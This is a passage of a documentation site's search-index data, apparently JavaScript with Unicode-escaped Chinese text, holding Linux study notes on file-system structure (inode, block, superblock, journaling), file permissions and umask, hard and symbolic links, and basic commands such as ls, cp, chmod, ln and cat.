\u53EF\u4EE5\u3002"},{header:"\u56DB\u3001\u6587\u4EF6\u7CFB\u7EDF",slug:"\u56DB\u3001\u6587\u4EF6\u7CFB\u7EDF",content:""},{header:"\u5206\u533A\u4E0E\u6587\u4EF6\u7CFB\u7EDF",slug:"\u5206\u533A\u4E0E\u6587\u4EF6\u7CFB\u7EDF",content:"\u5BF9\u5206\u533A\u8FDB\u884C\u683C\u5F0F\u5316\u662F\u4E3A\u4E86\u5728\u5206\u533A\u4E0A\u5EFA\u7ACB\u6587\u4EF6\u7CFB\u7EDF\u3002\u4E00\u4E2A\u5206\u533A\u901A\u5E38\u53EA\u80FD\u683C\u5F0F\u5316\u4E3A\u4E00\u4E2A\u6587\u4EF6\u7CFB\u7EDF\uFF0C\u4F46\u662F\u78C1\u76D8\u9635\u5217\u7B49\u6280\u672F\u53EF\u4EE5\u5C06\u4E00\u4E2A\u5206\u533A\u683C\u5F0F\u5316\u4E3A\u591A\u4E2A\u6587\u4EF6\u7CFB\u7EDF\u3002"},{header:"\u7EC4\u6210",slug:"\u7EC4\u6210",content:`\u6700\u4E3B\u8981\u7684\u51E0\u4E2A\u7EC4\u6210\u90E8\u5206\u5982\u4E0B\uFF1A inode\uFF1A\u4E00\u4E2A\u6587\u4EF6\u5360\u7528\u4E00\u4E2A inode\uFF0C\u8BB0\u5F55\u6587\u4EF6\u7684\u5C5E\u6027\uFF0C\u540C\u65F6\u8BB0\u5F55\u6B64\u6587\u4EF6\u7684\u5185\u5BB9\u6240\u5728\u7684 block \u7F16\u53F7\uFF1B
block\uFF1A\u8BB0\u5F55\u6587\u4EF6\u7684\u5185\u5BB9\uFF0C\u6587\u4EF6\u592A\u5927\u65F6\uFF0C\u4F1A\u5360\u7528\u591A\u4E2A block\u3002 \u9664\u6B64\u4E4B\u5916\u8FD8\u5305\u62EC\uFF1A superblock\uFF1A\u8BB0\u5F55\u6587\u4EF6\u7CFB\u7EDF\u7684\u6574\u4F53\u4FE1\u606F\uFF0C\u5305\u62EC inode \u548C block \u7684\u603B\u91CF\u3001\u4F7F\u7528\u91CF\u3001\u5269\u4F59\u91CF\uFF0C\u4EE5\u53CA\u6587\u4EF6\u7CFB\u7EDF\u7684\u683C\u5F0F\u4E0E\u76F8\u5173\u4FE1\u606F\u7B49\uFF1B
block bitmap\uFF1A\u8BB0\u5F55 block \u662F\u5426\u88AB\u4F7F\u7528\u7684\u4F4D\u56FE\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/BSD_disk.png" width="800)`},{header:"\u6587\u4EF6\u8BFB\u53D6",slug:"\u6587\u4EF6\u8BFB\u53D6",content:`\u5BF9\u4E8E Ext2 \u6587\u4EF6\u7CFB\u7EDF\uFF0C\u5F53\u8981\u8BFB\u53D6\u4E00\u4E2A\u6587\u4EF6\u7684\u5185\u5BB9\u65F6\uFF0C\u5148\u5728 inode \u4E2D\u67E5\u627E\u6587\u4EF6\u5185\u5BB9\u6240\u5728\u7684\u6240\u6709 block\uFF0C\u7136\u540E\u628A\u6240\u6709 block \u7684\u5185\u5BB9\u8BFB\u51FA\u6765\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/12a65cc6-20e0-4706-9fe6-3ba49413d7f6.png" width="500px">
\u800C\u5BF9\u4E8E FAT \u6587\u4EF6\u7CFB\u7EDF\uFF0C\u5B83\u6CA1\u6709 inode\uFF0C\u6BCF\u4E2A block \u4E2D\u5B58\u50A8\u7740\u4E0B\u4E00\u4E2A block \u7684\u7F16\u53F7\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5b718e86-7102-4bb6-8ca5-d1dd791530c5.png" width="500px">`},{header:"\u78C1\u76D8\u788E\u7247",slug:"\u78C1\u76D8\u788E\u7247",content:"\u6307\u4E00\u4E2A\u6587\u4EF6\u5185\u5BB9\u6240\u5728\u7684 block \u8FC7\u4E8E\u5206\u6563\uFF0C\u5BFC\u81F4\u78C1\u76D8\u78C1\u5934\u79FB\u52A8\u8DDD\u79BB\u8FC7\u5927\uFF0C\u4ECE\u800C\u964D\u4F4E\u78C1\u76D8\u8BFB\u5199\u6027\u80FD\u3002"},{header:"block",slug:"block",content:`\u5728 Ext2 \u6587\u4EF6\u7CFB\u7EDF\u4E2D\u6240\u652F\u6301\u7684 block \u5927\u5C0F\u6709 1K\uFF0C2K \u53CA 4K \u4E09\u79CD\uFF0C\u4E0D\u540C\u7684\u5927\u5C0F\u9650\u5236\u4E86\u5355\u4E2A\u6587\u4EF6\u548C\u6587\u4EF6\u7CFB\u7EDF\u7684\u6700\u5927\u5927\u5C0F\u3002 \u5927\u5C0F
1KB
2KB
4KB \u6700\u5927\u5355\u4E00\u6587\u4EF6
16GB
256GB
2TB \u6700\u5927\u6587\u4EF6\u7CFB\u7EDF
2TB
8TB
16TB \u4E00\u4E2A block \u53EA\u80FD\u88AB\u4E00\u4E2A\u6587\u4EF6\u6240\u4F7F\u7528\uFF0C\u672A\u4F7F\u7528\u7684\u90E8\u5206\u76F4\u63A5\u6D6A\u8D39\u4E86\u3002\u56E0\u6B64\u5982\u679C\u9700\u8981\u5B58\u50A8\u5927\u91CF\u7684\u5C0F\u6587\u4EF6\uFF0C\u90A3\u4E48\u6700\u597D\u9009\u7528\u6BD4\u8F83\u5C0F\u7684 block\u3002`},{header:"inode",slug:"inode",content:`inode \u5177\u4F53\u5305\u542B\u4EE5\u4E0B\u4FE1\u606F\uFF1A \u6743\u9650 (read/write/excute)\uFF1B
\u62E5\u6709\u8005\u4E0E\u7FA4\u7EC4 (owner/group)\uFF1B
\u5BB9\u91CF\uFF1B
\u5EFA\u7ACB\u6216\u72B6\u6001\u6539\u53D8\u7684\u65F6\u95F4 (ctime)\uFF1B
\u6700\u8FD1\u8BFB\u53D6\u65F6\u95F4 (atime)\uFF1B
\u6700\u8FD1\u4FEE\u6539\u65F6\u95F4 (mtime)\uFF1B
\u5B9A\u4E49\u6587\u4EF6\u7279\u6027\u7684\u65D7\u6807 (flag)\uFF0C\u5982 SetUID...\uFF1B
\u8BE5\u6587\u4EF6\u771F\u6B63\u5185\u5BB9\u7684\u6307\u5411 (pointer)\u3002 inode \u5177\u6709\u4EE5\u4E0B\u7279\u70B9\uFF1A \u6BCF\u4E2A inode \u5927\u5C0F\u5747\u56FA\u5B9A\u4E3A 128 bytes (\u65B0\u7684 ext4 \u4E0E xfs \u53EF\u8BBE\u5B9A\u5230 256 bytes)\uFF1B
\u6BCF\u4E2A\u6587\u4EF6\u90FD\u4EC5\u4F1A\u5360\u7528\u4E00\u4E2A inode\u3002 inode \u4E2D\u8BB0\u5F55\u4E86\u6587\u4EF6\u5185\u5BB9\u6240\u5728\u7684 block \u7F16\u53F7\uFF0C\u4F46\u662F\u6BCF\u4E2A block \u975E\u5E38\u5C0F\uFF0C\u4E00\u4E2A\u5927\u6587\u4EF6\u968F\u4FBF\u90FD\u9700\u8981\u51E0\u5341\u4E07\u7684 block\u3002\u800C\u4E00\u4E2A inode \u5927\u5C0F\u6709\u9650\uFF0C\u65E0\u6CD5\u76F4\u63A5\u5F15\u7528\u8FD9\u4E48\u591A block \u7F16\u53F7\u3002\u56E0\u6B64\u5F15\u5165\u4E86\u95F4\u63A5\u3001\u53CC\u95F4\u63A5\u3001\u4E09\u95F4\u63A5\u5F15\u7528\u3002\u95F4\u63A5\u5F15\u7528\u8BA9 inode \u8BB0\u5F55\u7684\u5F15\u7528 block \u5757\u8BB0\u5F55\u5F15\u7528\u4FE1\u606F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/inode_with_signatures.jpg" width="600)`},{header:"\u76EE\u5F55",slug:"\u76EE\u5F55",content:`\u5EFA\u7ACB\u4E00\u4E2A\u76EE\u5F55\u65F6\uFF0C\u4F1A\u5206\u914D\u4E00\u4E2A inode \u4E0E\u81F3\u5C11\u4E00\u4E2A block\u3002block \u8BB0\u5F55\u7684\u5185\u5BB9\u662F\u76EE\u5F55\u4E0B\u6240\u6709\u6587\u4EF6\u7684 inode \u7F16\u53F7\u4EE5\u53CA\u6587\u4EF6\u540D\u3002
\u53EF\u4EE5\u770B\u5230\u6587\u4EF6\u7684 inode \u672C\u8EAB\u4E0D\u8BB0\u5F55\u6587\u4EF6\u540D\uFF0C\u6587\u4EF6\u540D\u8BB0\u5F55\u5728\u76EE\u5F55\u4E2D\uFF0C\u56E0\u6B64\u65B0\u589E\u6587\u4EF6\u3001\u5220\u9664\u6587\u4EF6\u3001\u66F4\u6539\u6587\u4EF6\u540D\u8FD9\u4E9B\u64CD\u4F5C\u4E0E\u76EE\u5F55\u7684\u5199\u6743\u9650\u6709\u5173\u3002`},{header:"\u65E5\u5FD7",slug:"\u65E5\u5FD7",content:`\u5982\u679C\u7A81\u7136\u65AD\u7535\uFF0C\u90A3\u4E48\u6587\u4EF6\u7CFB\u7EDF\u4F1A\u53D1\u751F\u9519\u8BEF\uFF0C\u4F8B\u5982\u65AD\u7535\u524D\u53EA\u4FEE\u6539\u4E86 block bitmap\uFF0C\u800C\u8FD8\u6CA1\u6709\u5C06\u6570\u636E\u771F\u6B63\u5199\u5165 block \u4E2D\u3002
ext3/ext4 \u6587\u4EF6\u7CFB\u7EDF\u5F15\u5165\u4E86\u65E5\u5FD7\u529F\u80FD\uFF0C\u53EF\u4EE5\u5229\u7528\u65E5\u5FD7\u6765\u4FEE\u590D\u6587\u4EF6\u7CFB\u7EDF\u3002`},{header:"\u6302\u8F7D",slug:"\u6302\u8F7D",content:"\u6302\u8F7D\u5229\u7528\u76EE\u5F55\u4F5C\u4E3A\u6587\u4EF6\u7CFB\u7EDF\u7684\u8FDB\u5165\u70B9\uFF0C\u4E5F\u5C31\u662F\u8BF4\uFF0C\u8FDB\u5165\u76EE\u5F55\u4E4B\u540E\u5C31\u53EF\u4EE5\u8BFB\u53D6\u6587\u4EF6\u7CFB\u7EDF\u7684\u6570\u636E\u3002"},{header:"\u76EE\u5F55\u914D\u7F6E",slug:"\u76EE\u5F55\u914D\u7F6E",content:`\u4E3A\u4E86\u4F7F\u4E0D\u540C Linux \u53D1\u884C\u7248\u672C\u7684\u76EE\u5F55\u7ED3\u6784\u4FDD\u6301\u4E00\u81F4\u6027\uFF0CFilesystem Hierarchy Standard (FHS) \u89C4\u5B9A\u4E86 Linux \u7684\u76EE\u5F55\u7ED3\u6784\u3002\u6700\u57FA\u7840\u7684\u4E09\u4E2A\u76EE\u5F55\u5982\u4E0B\uFF1A / (root, \u6839\u76EE\u5F55)
/usr (unix software resource)\uFF1A\u6240\u6709\u7CFB\u7EDF\u9ED8\u8BA4\u8F6F\u4EF6\u90FD\u4F1A\u5B89\u88C5\u5230\u8FD9\u4E2A\u76EE\u5F55\uFF1B
/var (variable)\uFF1A\u5B58\u653E\u7CFB\u7EDF\u6216\u7A0B\u5E8F\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u7684\u6570\u636E\u6587\u4EF6\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/linux-filesystem.png" width=")`},{header:"\u4E94\u3001\u6587\u4EF6",slug:"\u4E94\u3001\u6587\u4EF6",content:""},{header:"\u6587\u4EF6\u5C5E\u6027",slug:"\u6587\u4EF6\u5C5E\u6027",content:`\u7528\u6237\u5206\u4E3A\u4E09\u79CD\uFF1A\u6587\u4EF6\u62E5\u6709\u8005\u3001\u7FA4\u7EC4\u4EE5\u53CA\u5176\u5B83\u4EBA\uFF0C\u5BF9\u4E0D\u540C\u7684\u7528\u6237\u6709\u4E0D\u540C\u7684\u6587\u4EF6\u6743\u9650\u3002
\u4F7F\u7528 ls \u67E5\u770B\u4E00\u4E2A\u6587\u4EF6\u65F6\uFF0C\u4F1A\u663E\u793A\u4E00\u4E2A\u6587\u4EF6\u7684\u4FE1\u606F\uFF0C\u4F8B\u5982 drwxr-xr-x 3 root root 17 May 6 00:14 .config\uFF0C\u5BF9\u8FD9\u4E2A\u4FE1\u606F\u7684\u89E3\u91CA\u5982\u4E0B\uFF1A drwxr-xr-x\uFF1A\u6587\u4EF6\u7C7B\u578B\u4EE5\u53CA\u6743\u9650\uFF0C\u7B2C 1 \u4F4D\u4E3A\u6587\u4EF6\u7C7B\u578B\u5B57\u6BB5\uFF0C\u540E 9 \u4F4D\u4E3A\u6587\u4EF6\u6743\u9650\u5B57\u6BB5
3\uFF1A\u94FE\u63A5\u6570
root\uFF1A\u6587\u4EF6\u62E5\u6709\u8005
root\uFF1A\u6240\u5C5E\u7FA4\u7EC4
17\uFF1A\u6587\u4EF6\u5927\u5C0F
May 6 00:14\uFF1A\u6587\u4EF6\u6700\u540E\u88AB\u4FEE\u6539\u7684\u65F6\u95F4
.config\uFF1A\u6587\u4EF6\u540D \u5E38\u89C1\u7684\u6587\u4EF6\u7C7B\u578B\u53CA\u5176\u542B\u4E49\u6709\uFF1A d\uFF1A\u76EE\u5F55
-\uFF1A\u6587\u4EF6
l\uFF1A\u94FE\u63A5\u6587\u4EF6 9 \u4F4D\u7684\u6587\u4EF6\u6743\u9650\u5B57\u6BB5\u4E2D\uFF0C\u6BCF 3 \u4E2A\u4E3A\u4E00\u7EC4\uFF0C\u5171 3 \u7EC4\uFF0C\u6BCF\u4E00\u7EC4\u5206\u522B\u4EE3\u8868\u5BF9\u6587\u4EF6\u62E5\u6709\u8005\u3001\u6240\u5C5E\u7FA4\u7EC4\u4EE5\u53CA\u5176\u5B83\u4EBA\u7684\u6587\u4EF6\u6743\u9650\u3002\u4E00\u7EC4\u6743\u9650\u4E2D\u7684 3 \u4F4D\u5206\u522B\u4E3A r\u3001w\u3001x \u6743\u9650\uFF0C\u8868\u793A\u53EF\u8BFB\u3001\u53EF\u5199\u3001\u53EF\u6267\u884C\u3002
\u6587\u4EF6\u65F6\u95F4\u6709\u4EE5\u4E0B\u4E09\u79CD\uFF1A modification time (mtime)\uFF1A\u6587\u4EF6\u7684\u5185\u5BB9\u66F4\u65B0\u5C31\u4F1A\u66F4\u65B0\uFF1B
status time (ctime)\uFF1A\u6587\u4EF6\u7684\u72B6\u6001\uFF08\u6743\u9650\u3001\u5C5E\u6027\uFF09\u66F4\u65B0\u5C31\u4F1A\u66F4\u65B0\uFF1B
access time (atime)\uFF1A\u8BFB\u53D6\u6587\u4EF6\u65F6\u5C31\u4F1A\u66F4\u65B0\u3002`},{header:"\u6587\u4EF6\u4E0E\u76EE\u5F55\u7684\u57FA\u672C\u64CD\u4F5C",slug:"\u6587\u4EF6\u4E0E\u76EE\u5F55\u7684\u57FA\u672C\u64CD\u4F5C",content:""},{header:"1. ls",slug:"_1-ls",content:`\u5217\u51FA\u6587\u4EF6\u6216\u8005\u76EE\u5F55\u7684\u4FE1\u606F\uFF0C\u76EE\u5F55\u7684\u4FE1\u606F\u5C31\u662F\u5176\u4E2D\u5305\u542B\u7684\u6587\u4EF6\u3002
## ls [-aAdfFhilnrRSt] file|dir
-a \uFF1A\u5217\u51FA\u5168\u90E8\u7684\u6587\u4EF6
-d \uFF1A\u4EC5\u5217\u51FA\u76EE\u5F55\u672C\u8EAB
-l \uFF1A\u4EE5\u957F\u6570\u636E\u4E32\u884C\u5217\u51FA\uFF0C\u5305\u542B\u6587\u4EF6\u7684\u5C5E\u6027\u4E0E\u6743\u9650\u7B49\u7B49\u6570\u636E`},{header:"2. cd",slug:"_2-cd",content:`\u66F4\u6362\u5F53\u524D\u76EE\u5F55\u3002
cd [\u76F8\u5BF9\u8DEF\u5F84\u6216\u7EDD\u5BF9\u8DEF\u5F84]`},{header:"3. mkdir",slug:"_3-mkdir",content:`\u521B\u5EFA\u76EE\u5F55\u3002
## mkdir [-mp] \u76EE\u5F55\u540D\u79F0
-m \uFF1A\u914D\u7F6E\u76EE\u5F55\u6743\u9650
-p \uFF1A\u9012\u5F52\u521B\u5EFA\u76EE\u5F55`},{header:"4. rmdir",slug:"_4-rmdir",content:`\u5220\u9664\u76EE\u5F55\uFF0C\u76EE\u5F55\u5FC5\u987B\u4E3A\u7A7A\u3002
rmdir [-p] \u76EE\u5F55\u540D\u79F0
-p \uFF1A\u9012\u5F52\u5220\u9664\u76EE\u5F55`},{header:"5. touch",slug:"_5-touch",content:`\u66F4\u65B0\u6587\u4EF6\u65F6\u95F4\u6216\u8005\u5EFA\u7ACB\u65B0\u6587\u4EF6\u3002
## touch [-acdmt] filename
-a \uFF1A \u66F4\u65B0 atime
-c \uFF1A \u66F4\u65B0 ctime\uFF0C\u82E5\u8BE5\u6587\u4EF6\u4E0D\u5B58\u5728\u5219\u4E0D\u5EFA\u7ACB\u65B0\u6587\u4EF6
-m \uFF1A \u66F4\u65B0 mtime
-d \uFF1A \u540E\u9762\u53EF\u4EE5\u63A5\u66F4\u65B0\u65E5\u671F\u800C\u4E0D\u4F7F\u7528\u5F53\u524D\u65E5\u671F\uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528 --date="\u65E5\u671F\u6216\u65F6\u95F4"
-t \uFF1A \u540E\u9762\u53EF\u4EE5\u63A5\u66F4\u65B0\u65F6\u95F4\u800C\u4E0D\u4F7F\u7528\u5F53\u524D\u65F6\u95F4\uFF0C\u683C\u5F0F\u4E3A[YYYYMMDDhhmm]`},{header:"6. cp",slug:"_6-cp",content:`\u590D\u5236\u6587\u4EF6\u3002\u5982\u679C\u6E90\u6587\u4EF6\u6709\u4E24\u4E2A\u4EE5\u4E0A\uFF0C\u5219\u76EE\u7684\u6587\u4EF6\u4E00\u5B9A\u8981\u662F\u76EE\u5F55\u624D\u884C\u3002
cp [-adfilprsu] source destination
-a \uFF1A\u76F8\u5F53\u4E8E -dr --preserve=all
-d \uFF1A\u82E5\u6765\u6E90\u6587\u4EF6\u4E3A\u94FE\u63A5\u6587\u4EF6\uFF0C\u5219\u590D\u5236\u94FE\u63A5\u6587\u4EF6\u5C5E\u6027\u800C\u975E\u6587\u4EF6\u672C\u8EAB
-i \uFF1A\u82E5\u76EE\u6807\u6587\u4EF6\u5DF2\u7ECF\u5B58\u5728\u65F6\uFF0C\u5728\u8986\u76D6\u524D\u4F1A\u5148\u8BE2\u95EE
-p \uFF1A\u8FDE\u540C\u6587\u4EF6\u7684\u5C5E\u6027\u4E00\u8D77\u590D\u5236\u8FC7\u53BB
-r \uFF1A\u9012\u5F52\u590D\u5236
-u \uFF1Adestination \u6BD4 source \u65E7\u624D\u66F4\u65B0 destination\uFF0C\u6216 destination \u4E0D\u5B58\u5728\u7684\u60C5\u51B5\u4E0B\u624D\u590D\u5236
--preserve=all \uFF1A\u9664\u4E86 -p \u7684\u6743\u9650\u76F8\u5173\u53C2\u6570\u5916\uFF0C\u8FD8\u52A0\u5165 SELinux \u7684\u5C5E\u6027, links, xattr \u7B49\u4E5F\u590D\u5236\u4E86`},{header:"7. rm",slug:"_7-rm",content:`\u5220\u9664\u6587\u4EF6\u3002
## rm [-fir] \u6587\u4EF6\u6216\u76EE\u5F55
-r \uFF1A\u9012\u5F52\u5220\u9664`},{header:"8. mv",slug:"_8-mv",content:`\u79FB\u52A8\u6587\u4EF6\u3002
## mv [-fiu] source destination
## mv [options] source1 source2 source3 .... directory
-f \uFF1A force \u5F3A\u5236\u7684\u610F\u601D\uFF0C\u5982\u679C\u76EE\u6807\u6587\u4EF6\u5DF2\u7ECF\u5B58\u5728\uFF0C\u4E0D\u4F1A\u8BE2\u95EE\u800C\u76F4\u63A5\u8986\u76D6`},{header:"\u4FEE\u6539\u6743\u9650",slug:"\u4FEE\u6539\u6743\u9650",content:`\u53EF\u4EE5\u5C06\u4E00\u7EC4\u6743\u9650\u7528\u6570\u5B57\u6765\u8868\u793A\uFF0C\u6B64\u65F6\u4E00\u7EC4\u6743\u9650\u7684 3 \u4E2A\u4F4D\u5F53\u505A\u4E8C\u8FDB\u5236\u6570\u5B57\u7684\u4F4D\uFF0C\u4ECE\u5DE6\u5230\u53F3\u6BCF\u4E2A\u4F4D\u7684\u6743\u503C\u4E3A 4\u30012\u30011\uFF0C\u5373\u6BCF\u4E2A\u6743\u9650\u5BF9\u5E94\u7684\u6570\u5B57\u6743\u503C\u4E3A r : 4\u3001w : 2\u3001x : 1\u3002
## chmod [-R] xyz dirname/filename
\u793A\u4F8B\uFF1A\u5C06 .bashrc \u6587\u4EF6\u7684\u6743\u9650\u4FEE\u6539\u4E3A -rwxr-xr--\u3002
## chmod 754 .bashrc
\u4E5F\u53EF\u4EE5\u4F7F\u7528\u7B26\u53F7\u6765\u8BBE\u5B9A\u6743\u9650\u3002
## chmod [ugoa] [+-=] [rwx] dirname/filename
- u\uFF1A\u62E5\u6709\u8005
- g\uFF1A\u6240\u5C5E\u7FA4\u7EC4
- o\uFF1A\u5176\u4ED6\u4EBA
- a\uFF1A\u6240\u6709\u4EBA
- +\uFF1A\u6DFB\u52A0\u6743\u9650
- -\uFF1A\u79FB\u9664\u6743\u9650
- =\uFF1A\u8BBE\u5B9A\u6743\u9650
\u793A\u4F8B\uFF1A\u4E3A .bashrc \u6587\u4EF6\u7684\u6240\u6709\u7528\u6237\u6DFB\u52A0\u5199\u6743\u9650\u3002
## chmod a+w .bashrc`},{header:"\u9ED8\u8BA4\u6743\u9650",slug:"\u9ED8\u8BA4\u6743\u9650",content:`\u6587\u4EF6\u9ED8\u8BA4\u6743\u9650\uFF1A\u6587\u4EF6\u9ED8\u8BA4\u6CA1\u6709\u53EF\u6267\u884C\u6743\u9650\uFF0C\u56E0\u6B64\u4E3A 666\uFF0C\u4E5F\u5C31\u662F -rw-rw-rw- \u3002
\u76EE\u5F55\u9ED8\u8BA4\u6743\u9650\uFF1A\u76EE\u5F55\u5FC5\u987B\u8981\u80FD\u591F\u8FDB\u5165\uFF0C\u4E5F\u5C31\u662F\u5FC5\u987B\u62E5\u6709\u53EF\u6267\u884C\u6743\u9650\uFF0C\u56E0\u6B64\u4E3A 777 \uFF0C\u4E5F\u5C31\u662F drwxrwxrwx\u3002 \u53EF\u4EE5\u901A\u8FC7 umask \u8BBE\u7F6E\u6216\u8005\u67E5\u770B\u9ED8\u8BA4\u6743\u9650\uFF0C\u901A\u5E38\u4EE5\u63A9\u7801\u7684\u5F62\u5F0F\u6765\u8868\u793A\uFF0C\u4F8B\u5982 002 \u8868\u793A\u5176\u5B83\u7528\u6237\u7684\u6743\u9650\u53BB\u9664\u4E86\u4E00\u4E2A 2 \u7684\u6743\u9650\uFF0C\u4E5F\u5C31\u662F\u5199\u6743\u9650\uFF0C\u56E0\u6B64\u5EFA\u7ACB\u65B0\u6587\u4EF6\u65F6\u9ED8\u8BA4\u7684\u6743\u9650\u4E3A -rw-rw-r--\u3002`},{header:"\u76EE\u5F55\u7684\u6743\u9650",slug:"\u76EE\u5F55\u7684\u6743\u9650",content:`\u6587\u4EF6\u540D\u4E0D\u662F\u5B58\u50A8\u5728\u4E00\u4E2A\u6587\u4EF6\u7684\u5185\u5BB9\u4E2D\uFF0C\u800C\u662F\u5B58\u50A8\u5728\u4E00\u4E2A\u6587\u4EF6\u6240\u5728\u7684\u76EE\u5F55\u4E2D\u3002\u56E0\u6B64\uFF0C\u62E5\u6709\u6587\u4EF6\u7684 w \u6743\u9650\u5E76\u4E0D\u80FD\u5BF9\u6587\u4EF6\u540D\u8FDB\u884C\u4FEE\u6539\u3002
\u76EE\u5F55\u5B58\u50A8\u6587\u4EF6\u5217\u8868\uFF0C\u4E00\u4E2A\u76EE\u5F55\u7684\u6743\u9650\u4E5F\u5C31\u662F\u5BF9\u5176\u6587\u4EF6\u5217\u8868\u7684\u6743\u9650\u3002\u56E0\u6B64\uFF0C\u76EE\u5F55\u7684 r \u6743\u9650\u8868\u793A\u53EF\u4EE5\u8BFB\u53D6\u6587\u4EF6\u5217\u8868\uFF1Bw \u6743\u9650\u8868\u793A\u53EF\u4EE5\u4FEE\u6539\u6587\u4EF6\u5217\u8868\uFF0C\u5177\u4F53\u6765\u8BF4\uFF0C\u5C31\u662F\u6DFB\u52A0\u5220\u9664\u6587\u4EF6\uFF0C\u5BF9\u6587\u4EF6\u540D\u8FDB\u884C\u4FEE\u6539\uFF1Bx \u6743\u9650\u53EF\u4EE5\u8BA9\u8BE5\u76EE\u5F55\u6210\u4E3A\u5DE5\u4F5C\u76EE\u5F55\uFF0Cx \u6743\u9650\u662F r \u548C w \u6743\u9650\u7684\u57FA\u7840\uFF0C\u5982\u679C\u4E0D\u80FD\u4F7F\u4E00\u4E2A\u76EE\u5F55\u6210\u4E3A\u5DE5\u4F5C\u76EE\u5F55\uFF0C\u4E5F\u5C31\u6CA1\u529E\u6CD5\u8BFB\u53D6\u6587\u4EF6\u5217\u8868\u4EE5\u53CA\u5BF9\u6587\u4EF6\u5217\u8868\u8FDB\u884C\u4FEE\u6539\u4E86\u3002`},{header:"\u94FE\u63A5",slug:"\u94FE\u63A5",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1e46fd03-0cda-4d60-9b1c-0c256edaf6b2.png" width="450px">
## ln [-sf] source_filename dist_filename
-s \uFF1A\u9ED8\u8BA4\u662F\u5B9E\u4F53\u94FE\u63A5\uFF0C\u52A0 -s \u4E3A\u7B26\u53F7\u94FE\u63A5
-f \uFF1A\u5982\u679C\u76EE\u6807\u6587\u4EF6\u5B58\u5728\u65F6\uFF0C\u5148\u5220\u9664\u76EE\u6807\u6587\u4EF6`},{header:"1. \u5B9E\u4F53\u94FE\u63A5",slug:"_1-\u5B9E\u4F53\u94FE\u63A5",content:`\u5728\u76EE\u5F55\u4E0B\u521B\u5EFA\u4E00\u4E2A\u6761\u76EE\uFF0C\u8BB0\u5F55\u7740\u6587\u4EF6\u540D\u4E0E inode \u7F16\u53F7\uFF0C\u8FD9\u4E2A inode \u5C31\u662F\u6E90\u6587\u4EF6\u7684 inode\u3002
\u5220\u9664\u4EFB\u610F\u4E00\u4E2A\u6761\u76EE\uFF0C\u6587\u4EF6\u8FD8\u662F\u5B58\u5728\uFF0C\u53EA\u8981\u5F15\u7528\u6570\u91CF\u4E0D\u4E3A 0\u3002
\u6709\u4EE5\u4E0B\u9650\u5236\uFF1A\u4E0D\u80FD\u8DE8\u8D8A\u6587\u4EF6\u7CFB\u7EDF\u3001\u4E0D\u80FD\u5BF9\u76EE\u5F55\u8FDB\u884C\u94FE\u63A5\u3002
## ln /etc/crontab .
## ll -i /etc/crontab crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab`},{header:"2. \u7B26\u53F7\u94FE\u63A5",slug:"_2-\u7B26\u53F7\u94FE\u63A5",content:`\u7B26\u53F7\u94FE\u63A5\u6587\u4EF6\u4FDD\u5B58\u7740\u6E90\u6587\u4EF6\u6240\u5728\u7684\u7EDD\u5BF9\u8DEF\u5F84\uFF0C\u5728\u8BFB\u53D6\u65F6\u4F1A\u5B9A\u4F4D\u5230\u6E90\u6587\u4EF6\u4E0A\uFF0C\u53EF\u4EE5\u7406\u89E3\u4E3A Windows \u7684\u5FEB\u6377\u65B9\u5F0F\u3002
\u5F53\u6E90\u6587\u4EF6\u88AB\u5220\u9664\u4E86\uFF0C\u94FE\u63A5\u6587\u4EF6\u5C31\u6253\u4E0D\u5F00\u4E86\u3002
\u56E0\u4E3A\u8BB0\u5F55\u7684\u662F\u8DEF\u5F84\uFF0C\u6240\u4EE5\u53EF\u4EE5\u4E3A\u76EE\u5F55\u5EFA\u7ACB\u7B26\u53F7\u94FE\u63A5\u3002
## ll -i /etc/crontab /root/crontab2
34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab
53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -> /etc/crontab`},{header:"\u83B7\u53D6\u6587\u4EF6\u5185\u5BB9",slug:"\u83B7\u53D6\u6587\u4EF6\u5185\u5BB9",content:""},{header:"1. cat",slug:"_1-cat",content:`\u53D6\u5F97\u6587\u4EF6\u5185\u5BB9\u3002
## cat [-AbEnTv] filename
-n \uFF1A\u6253\u5370\u51FA\u884C\u53F7\uFF0C\u8FDE\u540C\u7A7A\u767D\u884C\u4E5F\u4F1A\u6709\u884C\u53F7\uFF0C-b \u4E0D\u4F1A`},{header:"2. tac",slug:"_2-tac",content:"\u662F cat \u7684\u53CD\u5411\u64CD\u4F5C\uFF0C\u4ECE\u6700\u540E\u4E00\u884C\u5F00\u59CB\u6253\u5370\u3002"},{header:"3. more",slug:"_3-more",content:"\u548C cat \u4E0D\u540C\u7684\u662F\u5B83\u53EF\u4EE5\u4E00\u9875\u4E00\u9875\u67E5\u770B\u6587\u4EF6\u5185\u5BB9\uFF0C\u6BD4\u8F83\u9002\u5408\u5927\u6587\u4EF6\u7684\u67E5\u770B\u3002"},{header:"4. less",slug:"_4-less",content:"\u548C more \u7C7B\u4F3C\uFF0C\u4F46\u662F\u591A\u4E86\u4E00\u4E2A\u5411\u524D\u7FFB\u9875\u7684\u529F\u80FD\u3002"},{header:"5. head",slug:"_5-head",content:`\u53D6\u5F97\u6587\u4EF6\u524D\u51E0\u884C\u3002
## head [-n number] filename
